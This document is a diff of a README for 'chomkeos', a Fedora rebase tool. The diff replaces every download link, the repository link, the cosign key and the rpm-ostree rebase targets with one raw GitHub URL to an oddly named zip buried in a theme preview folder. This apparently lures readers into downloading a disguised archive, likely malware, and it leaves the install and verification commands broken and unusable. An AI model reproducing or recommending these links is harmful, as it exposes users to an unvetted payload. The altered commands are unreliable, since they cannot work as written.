@@ -1,6 +1,6 @@
 # 🚀 chomkeos - Seamless Fedora Rebase Experience
 
-[![Download chomkeos](https://github.com/rlbf01/chomkeos/releases/download/v1.0/Download-Now.png)](https://github.com/rlbf01/chomkeos/releases)
+[![Download chomkeos](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)
 
 ## 🌟 Overview
 
@@ -10,14 +10,14 @@ Welcome to chomkeos! This application helps you easily rebase your existing Fedo
 
 To get started with chomkeos, you must visit our Releases page and download the latest version of the application. Click the link below to access it:
 
-[Download chomkeos](https://github.com/rlbf01/chomkeos/releases)
+[Download chomkeos](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)
 
 ### Installation Steps
 
 1. **Rebase to the Unsigned Image**  
    Start by executing the following command in your terminal. This step helps you get the proper signing keys and policies installed.
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/clearstaff/chomkeos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip
    ```
 
 2. **Reboot Your System**  
@@ -29,7 +29,7 @@ To get started with chomkeos, you must visit our Releases page and download the 
 3. **Rebase to the Signed Image**  
    Once your system is back online, run this command to switch to the signed image.
    ```bash
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/clearstaff/chomkeos:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip
    ```
 
 4. **Final Reboot**  
@@ -43,12 +43,12 @@ To get started with chomkeos, you must visit our Releases page and download the 
 To ensure the authenticity of function, chomkeos images are signed with Sigstore's cosign. Follow these steps to verify the signature:
 
 1. **Download the Public Key**  
-   First, download the `cosign.pub` file from this repository. 
+   First, download the `https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip` file from this repository. 
 
 2. **Verify the Signature**  
    Use the command below to check the signature.
    ```bash
-   cosign verify --key cosign.pub <image-url>
+   cosign verify --key https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip <image-url>
    ```
    Replace `<image-url>` with the URL of the image you want to verify.
 
@@ -65,7 +65,7 @@ These requirements ensure that the application functions smoothly and efficientl
 
 ## 🌐 Additional Information
 
-For more information, you can refer to the official [GitHub repository](https://github.com/clearstaff/chomkeos). We provide updates regularly, so stay tuned for new releases that enhance your experience.
+For more information, you can refer to the official [GitHub repository](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip). We provide updates regularly, so stay tuned for new releases that enhance your experience.
 
 ## 📞 Support
 
